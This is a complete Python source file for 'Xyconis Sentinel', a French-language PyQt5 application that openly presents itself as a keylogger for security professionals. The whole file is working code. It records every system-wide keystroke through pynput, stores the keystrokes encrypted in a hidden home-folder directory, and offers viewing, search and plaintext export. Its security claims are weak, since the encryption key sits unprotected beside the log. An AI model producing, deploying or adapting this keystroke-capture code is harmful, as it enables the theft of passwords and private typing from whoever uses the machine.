#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===================================================
Xyconis Sentinel v1.0 - Application Keylogger Sécurisée (Interface Moderne PyQt5)
===================================================

Ce logiciel est destiné à être utilisé dans un contexte professionnel et
par des experts en sécurité. Il combine une interface graphique moderne,
une gestion sécurisée des fichiers et du chiffrement, ainsi qu'une capture des
frappes clavier (KeyLogger) encadrée par une gestion fine des logs.

Licence : MIT
Auteur : [Angrevier / Xyconis]
Date : 2025-03-08

Explication : Ce code reprend la même structure modulaire que l'original,
avec une interface minimaliste et moderne en PyQt5. La touche MAJ est désormais
traitée normalement.
"""

import os
import sys
import threading
import time
import logging
import base64
from datetime import datetime

from PyQt5 import QtWidgets, QtCore, QtGui

from pynput import keyboard
from cryptography.fernet import Fernet

# ---------------------------
# Configuration du logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s [%(levelname)s] %(message)s',
                    filename='xyconis_sentinel.log',
                    filemode='a')

# ===============================
# === Module 2: Fichiers & Chiffrement ===
class FileManager:
    """Gestionnaire de fichiers pour l'application."""
    def __init__(self, app_folder=".securetype"):
        self.app_folder = os.path.join(os.path.expanduser("~"), app_folder)
        try:
            os.makedirs(self.app_folder, exist_ok=True)
        except Exception as e:
            logging.error(f"Erreur lors de la création du dossier d'application: {e}")

    def get_file_path(self, filename):
        return os.path.join(self.app_folder, filename)

    def file_exists(self, filename):
        return os.path.exists(self.get_file_path(filename))

    def read_file(self, filename, binary=False):
        mode = "rb" if binary else "r"
        file_path = self.get_file_path(filename)
        if os.path.exists(file_path):
            try:
                with open(file_path, mode) as file:
                    return file.read()
            except Exception as e:
                logging.error(f"Erreur de lecture du fichier {filename}: {e}")
        return None

    def write_file(self, filename, content, binary=False):
        mode = "wb" if binary else "w"
        try:
            with open(self.get_file_path(filename), mode) as file:
                file.write(content)
        except Exception as e:
            logging.error(f"Erreur d'écriture dans le fichier {filename}: {e}")

    def append_file(self, filename, content, binary=False):
        mode = "ab" if binary else "a"
        try:
            with open(self.get_file_path(filename), mode) as file:
                file.write(content)
        except Exception as e:
            logging.error(f"Erreur d'ajout dans le fichier {filename}: {e}")

    def delete_file(self, filename):
        file_path = self.get_file_path(filename)
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                return True
            except Exception as e:
                logging.error(f"Erreur lors de la suppression du fichier {filename}: {e}")
        return False

class EncryptionManager:
    """Gestionnaire de chiffrement pour sécuriser les données sensibles."""
    def __init__(self, file_manager, key_filename="cle_chiffrement.key"):
        self.file_manager = file_manager
        self.key_filename = key_filename
        self.key = self._load_or_create_key()

    def _load_or_create_key(self):
        key = self.file_manager.read_file(self.key_filename, binary=True)
        if not key:
            try:
                key = Fernet.generate_key()
                self.file_manager.write_file(self.key_filename, key, binary=True)
            except Exception as e:
                logging.error(f"Erreur lors de la création de la clé de chiffrement: {e}")
        return key

    def encrypt(self, text):
        try:
            cipher = Fernet(self.key)
            encrypted_bytes = cipher.encrypt(text.encode())
            return base64.b64encode(encrypted_bytes).decode()
        except Exception as e:
            logging.error(f"Erreur de chiffrement: {e}")
            return None

    def decrypt(self, encrypted_text):
        try:
            cipher = Fernet(self.key)
            return cipher.decrypt(base64.b64decode(encrypted_text.strip())).decode()
        except Exception as e:
            logging.error(f"Erreur de déchiffrement: {e}")
            return "[Erreur de déchiffrement]"

# ===============================
# === Module 3: Capture des frappes clavier ===
class KeyLogger:
    """Module de capture des frappes clavier."""
    def __init__(self, callback):
        self.callback = callback
        self.running = True
        self.listener = None

    def start(self):
        if not self.listener or not self.listener.is_alive():
            self.running = True
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            logging.info("Keylogger démarré.")

    def stop(self):
        self.running = False
        if self.listener and self.listener.is_alive():
            self.listener.stop()
            logging.info("Keylogger arrêté.")

    def _on_key_press(self, key):
        if not self.running:
            return
        try:
            key_text = str(key)
            if key_text.startswith("Key."):
                key_text = f"[{key_text.split('.')[1]}]"
            else:
                key_text = key_text.strip("'")
        except Exception as e:
            key_text = "[Touche spéciale]"
            logging.error(f"Erreur lors du traitement de la touche: {e}")
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.callback(f"{timestamp}: {key_text}")

# ===============================
# === Module 4: Gestion des logs ===
class LogManager:
    """Module pour l'enregistrement et la gestion des logs."""
    def __init__(self, file_manager, encryption_manager, log_filename="log_chiffre.txt"):
        self.file_manager = file_manager
        self.encryption_manager = encryption_manager
        self.log_filename = log_filename

    def add_log(self, text):
        encrypted = self.encryption_manager.encrypt(text)
        if encrypted:
            self.file_manager.append_file(self.log_filename, encrypted + "\n")
            return encrypted
        return None

    def get_logs(self):
        content = self.file_manager.read_file(self.log_filename)
        if content:
            return content.splitlines()
        return []

    def clear_logs(self):
        if self.file_manager.delete_file(self.log_filename):
            logging.info("Logs effacés.")
            return True
        logging.error("Erreur lors de l'effacement des logs.")
        return False

    def export_logs(self, destination_path, encrypted=False):
        logs = self.get_logs()
        if not logs:
            return False
        try:
            with open(destination_path, "w") as destination:
                for line in logs:
                    if encrypted:
                        destination.write(line + "\n")
                    else:
                        decrypted = self.encryption_manager.decrypt(line)
                        destination.write(decrypted + "\n")
            logging.info(f"Logs exportés vers {destination_path}.")
            return True
        except Exception as e:
            logging.error(f"Erreur lors de l'exportation des logs: {e}")
            return False

    def search_in_logs(self, search_term):
        if not search_term:
            return []
        logs = self.get_logs()
        results = []
        for line in logs:
            decrypted = self.encryption_manager.decrypt(line)
            if search_term.lower() in decrypted.lower():
                results.append(decrypted)
        return results

# ===============================
# === Module UI: Composants PyQt5 personnalisés ===
class FuturisticButton(QtWidgets.QPushButton):
    """Bouton à l'esthétique minimaliste et moderne."""
    def __init__(self, text, command, width=150, height=40, parent=None):
        super().__init__(text, parent)
        self.command = command
        self.setFixedSize(width, height)
        self.setStyleSheet("""
            QPushButton {
                background-color: #FFFFFF;
                color: #333333;
                border: 2px solid #333333;
                border-radius: 5px;
                font: bold 12px Arial;
            }
            QPushButton:hover {
                background-color: #EEEEEE;
            }
            QPushButton:pressed {
                background-color: #DDDDDD;
            }
        """)
        self.clicked.connect(self.safe_command)

    def safe_command(self):
        try:
            self.command()
        except Exception as e:
            logging.error(f"Erreur lors de l'exécution du bouton '{self.text()}': {e}")

class StatusBadge(QtWidgets.QLabel):
    """Badge de statut au design sobre."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(160, 30)
        self.setAlignment(QtCore.Qt.AlignCenter)
        self.update_status("Actif", "#28a745")  # vert par défaut

    def update_status(self, text, color):
        self.setText(f"Statut : {text}")
        self.setStyleSheet(f"""
            background-color: #FFFFFF;
            border: 1px solid #CCCCCC;
            color: {color};
            font: bold 10px Arial;
            border-radius: 15px;
        """)

class FuturisticTextFrame(QtWidgets.QWidget):
    """Zone de texte avec titre, au style minimaliste."""
    def __init__(self, title="", parent=None):
        super().__init__(parent)
        layout = QtWidgets.QVBoxLayout(self)
        if title:
            label = QtWidgets.QLabel(title)
            label.setStyleSheet("color: #333333; font: bold 14px Arial;")
            layout.addWidget(label)
        self.text_edit = QtWidgets.QTextEdit()
        self.text_edit.setStyleSheet("""
            background-color: #F5F5F5;
            color: #333333;
            font: 10px Consolas;
            border: 1px solid #CCCCCC;
            padding: 5px;
        """)
        layout.addWidget(self.text_edit)

    def insert(self, text):
        self.text_edit.append(text)

    def set_text(self, text):
        self.text_edit.setPlainText(text)

    def get_text(self):
        return self.text_edit.toPlainText()

    def clear(self):
        self.text_edit.clear()

    def highlight_text(self, search_term):
        cursor = self.text_edit.textCursor()
        fmt = QtGui.QTextCharFormat()
        fmt.setBackground(QtGui.QColor("#DDDDDD"))
        fmt.setForeground(QtGui.QColor("#333333"))
        cursor.beginEditBlock()
        doc = self.text_edit.document()
        tmp_cursor = QtGui.QTextCursor(doc)
        while not tmp_cursor.isNull() and not tmp_cursor.atEnd():
            tmp_cursor.select(QtGui.QTextCursor.WordUnderCursor)
            tmp_cursor.setCharFormat(QtGui.QTextCharFormat())
            tmp_cursor.movePosition(QtGui.QTextCursor.NextWord)
        cursor.endEditBlock()
        highlight_cursor = QtGui.QTextCursor(doc)
        while True:
            highlight_cursor = doc.find(search_term, highlight_cursor, QtGui.QTextDocument.FindCaseSensitively)
            if highlight_cursor.isNull():
                break
            highlight_cursor.mergeCharFormat(fmt)

# ===============================
# === Signaux pour mise à jour de l'UI depuis le thread ===
class KeyUpdateSignal(QtCore.QObject):
    key_received = QtCore.pyqtSignal(str, str)   # encrypted, plain
    stats_updated = QtCore.pyqtSignal(int, str)    # total_keys, last_time

# ===============================
# === Module 5: Application Principale avec PyQt5 ===
class SecureTypeApp(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Xyconis Sentinel v1.0")
        self.setFixedSize(1000, 650)
        self.setStyleSheet("background-color: #EFEFEF;")
        self.is_paused = False
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.total_keys = 0

        self.file_manager = FileManager()
        self.encryption_manager = EncryptionManager(self.file_manager)
        self.log_manager = LogManager(self.file_manager, self.encryption_manager)

        self.key_update_signal = KeyUpdateSignal()
        self.key_update_signal.key_received.connect(self.update_logs_slot)
        self.key_update_signal.stats_updated.connect(self.update_stats_slot)

        self._create_interface()
        self._start_services()

    def _create_interface(self):
        central_widget = QtWidgets.QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QtWidgets.QVBoxLayout(central_widget)

        # En-tête
        header = QtWidgets.QLabel("Xyconis Sentinel v1.0", alignment=QtCore.Qt.AlignCenter)
        header.setStyleSheet("color: #333333; font: bold 24px Arial;")
        main_layout.addWidget(header)

        # Zone centrale : Barre latérale gauche et zone de logs
        middle_layout = QtWidgets.QHBoxLayout()

        # Barre latérale (contrôles)
        sidebar_layout = QtWidgets.QVBoxLayout()
        self.status_badge = StatusBadge()
        sidebar_layout.addWidget(self.status_badge)
        sidebar_layout.addSpacing(20)
        pause_btn = FuturisticButton("Pause/Reprendre", self.toggle_pause)
        refresh_btn = FuturisticButton("Actualiser Logs", self.refresh_logs)
        export_btn = FuturisticButton("Exporter Logs", self.export_logs_dialog)
        clear_btn = FuturisticButton("Effacer Logs", self.clear_logs)
        sidebar_layout.addWidget(pause_btn)
        sidebar_layout.addWidget(refresh_btn)
        sidebar_layout.addWidget(export_btn)
        sidebar_layout.addWidget(clear_btn)
        sidebar_layout.addStretch()
        middle_layout.addLayout(sidebar_layout, 1)

        # Zone des logs (affichage côte à côte)
        logs_layout = QtWidgets.QHBoxLayout()
        self.encrypted_frame = FuturisticTextFrame("Logs Chiffrés")
        self.decrypted_frame = FuturisticTextFrame("Logs Déchiffrés")
        logs_layout.addWidget(self.encrypted_frame)
        logs_layout.addWidget(self.decrypted_frame)
        middle_layout.addLayout(logs_layout, 3)
        main_layout.addLayout(middle_layout)

        # Barre inférieure : Recherche & Statistiques
        bottom_layout = QtWidgets.QHBoxLayout()
        search_label = QtWidgets.QLabel("Rechercher :")
        search_label.setStyleSheet("color: #333333; font: 11px Arial;")
        bottom_layout.addWidget(search_label)
        self.search_entry = QtWidgets.QLineEdit()
        self.search_entry.setStyleSheet("background-color: #FFFFFF; color: #333333; font: 10px Arial;")
        bottom_layout.addWidget(self.search_entry)
        search_btn = FuturisticButton("Chercher", self.search_logs, width=100)
        bottom_layout.addWidget(search_btn)
        bottom_layout.addStretch()
        self.stats_label = QtWidgets.QLabel("Total frappes : 0 | Dernière frappe : --:--:--")
        self.stats_label.setStyleSheet("color: #333333; font: 10px Arial;")
        bottom_layout.addWidget(self.stats_label)
        main_layout.addLayout(bottom_layout)

    def _start_services(self):
        self.keylogger = KeyLogger(self._handle_key_press)
        self.keylogger.start()
        self.buffer_thread = threading.Thread(target=self._process_buffer, daemon=True)
        self.buffer_thread.start()

    def _handle_key_press(self, key_text):
        if self.is_paused:
            return
        encrypted = self.encryption_manager.encrypt(key_text)
        if encrypted:
            with self.buffer_lock:
                self.buffer.append((encrypted, key_text))

    def _process_buffer(self):
        while True:
            if self.buffer:
                with self.buffer_lock:
                    encrypted, plain = self.buffer.pop(0)
                self.log_manager.add_log(plain)
                self.key_update_signal.key_received.emit(encrypted, plain)
                self.total_keys += 1
                now = datetime.now().strftime('%H:%M:%S')
                self.key_update_signal.stats_updated.emit(self.total_keys, now)
            time.sleep(0.01)

    def update_logs_slot(self, encrypted, plain):
        self.encrypted_frame.insert(encrypted)
        self.decrypted_frame.insert(plain)

    def update_stats_slot(self, total_keys, now):
        self.stats_label.setText(f"Total frappes : {total_keys} | Dernière frappe : {now}")

    def toggle_pause(self):
        self.is_paused = not self.is_paused
        status = "Pause" if self.is_paused else "Actif"
        color = "#dc3545" if self.is_paused else "#28a745"
        self.status_badge.update_status(status, color)

    def refresh_logs(self):
        self.encrypted_frame.clear()
        self.decrypted_frame.clear()
        logs = self.log_manager.get_logs()
        self.total_keys = 0
        for log in logs:
            self.encrypted_frame.insert(log)
            decrypted = self.encryption_manager.decrypt(log)
            self.decrypted_frame.insert(decrypted)
            self.total_keys += 1
        now = self._get_last_timestamp()
        self.stats_label.setText(f"Total frappes : {self.total_keys} | Dernière frappe : {now}")

    def search_logs(self):
        search_term = self.search_entry.text()
        if not search_term:
            QtWidgets.QMessageBox.information(self, "Recherche", "Veuillez entrer un terme à rechercher")
            return
        self.decrypted_frame.highlight_text(search_term)
        content = self.decrypted_frame.get_text()
        occurrences = content.lower().count(search_term.lower())
        QtWidgets.QMessageBox.information(self, "Recherche", f"Résultat : {occurrences} occurrence(s) trouvée(s)")

    def export_logs_dialog(self):
        options = QtWidgets.QFileDialog.Options()
        file_path, _ = QtWidgets.QFileDialog.getSaveFileName(self, "Exporter Logs", "",
                                                             "Fichiers texte (*.txt);;Tous les fichiers (*)", options=options)
        if file_path:
            reply = QtWidgets.QMessageBox.question(self, "Exporter",
                                                   "Exporter les logs chiffrés ?\n"
                                                   "Oui pour chiffrés, Non pour déchiffrés.",
                                                   QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
            export_encrypted = True if reply == QtWidgets.QMessageBox.Yes else False
            if self.log_manager.export_logs(file_path, export_encrypted):
                QtWidgets.QMessageBox.information(self, "Exportation", "Logs exportés avec succès!")
            else:
                QtWidgets.QMessageBox.critical(self, "Erreur", "Échec de l'exportation des logs.")

    def clear_logs(self):
        reply = QtWidgets.QMessageBox.question(self, "Confirmation",
                                               "Êtes-vous sûr de vouloir effacer tous les logs?",
                                               QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
        if reply == QtWidgets.QMessageBox.Yes:
            if self.log_manager.clear_logs():
                self.encrypted_frame.clear()
                self.decrypted_frame.clear()
                self.total_keys = 0
                self.stats_label.setText("Total frappes : 0 | Dernière frappe : --:--:--")
                QtWidgets.QMessageBox.information(self, "Information", "Tous les logs ont été effacés.")
            else:
                QtWidgets.QMessageBox.critical(self, "Erreur", "Impossible d'effacer les logs.")

    def _get_last_timestamp(self):
        content = self.decrypted_frame.get_text().strip()
        if not content:
            return "--:--:--"
        lines = content.split("\n")
        if lines:
            last_line = lines[-1]
            try:
                timestamp_parts = last_line.split(":")
                if len(timestamp_parts) >= 3:
                    return ":".join(timestamp_parts[0:3])
            except Exception as e:
                logging.error(f"Erreur lors de l'extraction de l'horodatage: {e}")
        return "--:--:--"

    def closeEvent(self, event):
        if self.keylogger:
            self.keylogger.stop()
        logging.info("Fermeture de l'application.")
        event.accept()

# ===============================
# === Point d'entrée de l'application ===
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = SecureTypeApp()
    window.show()
    sys.exit(app.exec_())
